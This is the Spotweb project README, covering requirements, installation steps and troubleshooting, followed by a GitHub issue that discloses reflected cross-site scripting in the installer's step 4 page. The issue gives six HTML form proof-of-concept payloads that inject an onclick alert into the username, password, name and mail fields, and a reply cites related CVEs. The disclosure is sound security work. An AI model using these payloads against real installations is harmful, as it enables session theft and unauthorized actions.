## Installation requirements

Spotweb has been regulary tested on several different systems. Spotweb is mostly used on:

* Unix-based (Linux, FreeBSD) operating systems or small NAS systems like Synology and QNAP.
* Apache Webserver.
* PHP v5.6 or higher, with at least these modules:
  + curl
  + dom
  + gettext
  + mbstring
  + xml
  + zip
  + zlib
  + gd
  + openssl
* MySQL, PostgreSQL and SQLite, where SQLite is the least supported and tested database engine.

Please run '<http://yourdomain.com/install.php>' from within your browser before attempting anything further with Spotweb and make sure
all items are checked 'OK'.

## Installation Master branch:

Installation is the toughest part of Spotweb. Depending on your platform you should look at the different tutorials available on the [Spotweb wiki](https://github.com/spotweb/spotweb/wiki), but the basic steps are:

1. Ensure you have an database server installed (MySQL, PostgreSQL or SQLite).
2. Create an empty 'spotweb' database.
3. Ensure you have a webserver running and PHP is configured for this webserver.
4. [Download the Spotweb zip file.](https://github.com/spotweb/spotweb/archive/master.zip) or from within your public www folder: "git clone -b master <https://github.com/spotweb/spotweb.git> ."
5. Unpack the zip file to a directory of choice.
6. Open 'install.php' in your browser until everything is 'OK'. Fix the parts which aren't OK.
7. Follow the wizard and perform the instructions as given by the wizard.

## Installation Development branch:

1. Ensure you have an database server installed (MySQL, PostgreSQL or SQLite).
2. Create an empty 'spotweb' database.
3. Ensure you have a webserver running and PHP is configured for this webserver.
4. [Download the Spotweb zip file.](https://github.com/spotweb/spotweb/archive/develop.zip) or from within your public www folder: "git clone -b develop <https://github.com/spotweb/spotweb.git> ."
5. Unpack the zip file to a directory of choice.
6. Open 'install.php' in your browser until everything is 'OK'. Fix the parts which aren't OK.
7. Follow the wizard and perform the instructions as given by the wizard.

## Troubleshooting

When a white page appears instead of your Spotweb installation, this usually indicates an typing error in either
your ownsettings.php, dbsettings.inc.php or a configuration error in your webserver.

Please consult your Apache's errorlog for the exact error and fix it.

| **Describe the bug/issue**   * Reflected Cross-Site Scripting (XSS) may allow an attacker to execute JavaScript code in the context of the victim’s browser. * Note that these multiple XSS vulnerabilities exist in the spotweb.   **Have you searched the internet or Github for an answer?**   * Not related   **To Reproduce** Steps to reproduce the behavior:   1. Go to the installation page 2. Complete the configuration including DB connection => goto step 4 3. Access each page of these HTML files.  Exploit 1 - exploit `username` parameter ``` <html> <form method="POST" action="http://[localhost]/spotweb/install.php?page=4">   <input name='settingsform[username]' value="1' onclick='alert(1)">   <button>Send my greetings</button> </form> </html> ``` Exploit 2 - exploit `newpassword1` parameter ``` <html> <form method="POST" action="http://[localhost]/spotweb/install.php?page=4">   <input name='settingsform[newpassword1]' value="1' onclick='alert(1)">   <button>Send my greetings</button> </form> </html> ``` Exploit 3 - exploit `newpassword2` parameter ``` <html> <form method="POST" action="http://[localhost]/spotweb/install.php?page=4">   <input name='settingsform[newpassword2]' value="1' onclick='alert(1)">   <button>Send my greetings</button> </form> </html> ``` Exploit 4 - exploit `firstname` parameter ``` <html> <form method="POST" action="http://[localhost]/spotweb/install.php?page=4">   <input name='settingsform[firstname]' value="1' onclick='alert(1)">   <button>Send my greetings</button> </form> </html> ``` Exploit 5 - exploit `lastname` parameter ``` <html> <form method="POST" action="http://[localhost]/spotweb/install.php?page=4">   <input name='settingsform[lastname]' value="1' onclick='alert(1)">   <button>Send my greetings</button> </form> </html> ``` Exploit 6 - exploit `mail` parameter ``` <html> <form method="POST" action="http://[localhost]/spotweb/install.php?page=4">   <input name='settingsform[mail]' value="1' onclick='alert(1)">   <button>Send my greetings</button> </form> </html> ```  4. Click each text field 5. Boom!   **Expected behavior**   * This may lead to unauthorized actions being performed, unauthorized access to data, stealing of session information, denial of service, etc. An attacker needs to coerce a user into visiting a link with the XSS payload to be properly exploited against a victim.   **Screenshots** [스크린샷 2021-09-12 오후 6 46 33](https://user-images.githubusercontent.com/26154873/132982963-45ae8aa4-f761-438f-a642-9c791e4022d7.png)  **Desktop (please complete the following information):**   * (server) OS: ubuntu * (client) OS: window * Browser chrome * Spotweb Version 1.5.1 and below versions * Which branch Develop and Master * PHP version 7.1   **Additional context** The code below displays the user-controlled parameter `username`, `newpassword1`, `newpassword2`, `firstname`, `lastname` and `mail` with incorrect sanitization:     [spotweb/templates/installer/step-004.inc.php](https://github.com/spotweb/spotweb/blob/be2ab76cfa2efe28b426a1e1ce582eba0327c25b/templates/installer/step-004.inc.php#L41)  Line 41 in [be2ab76](/spotweb/spotweb/commit/be2ab76cfa2efe28b426a1e1ce582eba0327c25b)   |  | value='<?php echo htmlspecialchars($form['username']); ?>'/></td> | | --- | --- |      [spotweb/templates/installer/step-004.inc.php](https://github.com/spotweb/spotweb/blob/be2ab76cfa2efe28b426a1e1ce582eba0327c25b/templates/installer/step-004.inc.php#L46)  Line 46 in [be2ab76](/spotweb/spotweb/commit/be2ab76cfa2efe28b426a1e1ce582eba0327c25b)   |  | value='<?php echo htmlspecialchars($form['newpassword1']); ?>'/></td> | | --- | --- |      [spotweb/templates/installer/step-004.inc.php](https://github.com/spotweb/spotweb/blob/be2ab76cfa2efe28b426a1e1ce582eba0327c25b/templates/installer/step-004.inc.php#L51)  Line 51 in [be2ab76](/spotweb/spotweb/commit/be2ab76cfa2efe28b426a1e1ce582eba0327c25b)   |  | value='<?php echo htmlspecialchars($form['newpassword2']); ?>'/></td> | | --- | --- |      [spotweb/templates/installer/step-004.inc.php](https://github.com/spotweb/spotweb/blob/be2ab76cfa2efe28b426a1e1ce582eba0327c25b/templates/installer/step-004.inc.php#L56)  Line 56 in [be2ab76](/spotweb/spotweb/commit/be2ab76cfa2efe28b426a1e1ce582eba0327c25b)   |  | value='<?php echo htmlspecialchars($form['firstname']); ?>'/></td> | | --- | --- |      [spotweb/templates/installer/step-004.inc.php](https://github.com/spotweb/spotweb/blob/be2ab76cfa2efe28b426a1e1ce582eba0327c25b/templates/installer/step-004.inc.php#L61)  Line 61 in [be2ab76](/spotweb/spotweb/commit/be2ab76cfa2efe28b426a1e1ce582eba0327c25b)   |  | value='<?php echo htmlspecialchars($form['lastname']); ?>'/></td> | | --- | --- |      [spotweb/templates/installer/step-004.inc.php](https://github.com/spotweb/spotweb/blob/be2ab76cfa2efe28b426a1e1ce582eba0327c25b/templates/installer/step-004.inc.php#L66)  Line 66 in [be2ab76](/spotweb/spotweb/commit/be2ab76cfa2efe28b426a1e1ce582eba0327c25b)   |  | value='<?php echo htmlspecialchars($form['mail']); ?>'/></td> | | --- | --- | |

| Yes, you are right. However, remember that XSS vulnerabilities that occur during the installation process are also vulnerabilities. For example, in [CVE-2021-37389](https://github.com/advisories/GHSA-pqwj-p67x-f5r3 "CVE-2021-37389"), [CVE-2014-9571](https://github.com/advisories/GHSA-g3r5-9xj4-995x "CVE-2014-9571"), [CVE-2020-26043](https://github.com/advisories/GHSA-qjp8-cxc7-rc48 "CVE-2020-26043"), [CVE-2020-18670](https://github.com/advisories/GHSA-hj5j-mwv8-vhfp "CVE-2020-18670"), etc., you can see the vendors acknowledging that there are vulnerabilities. |
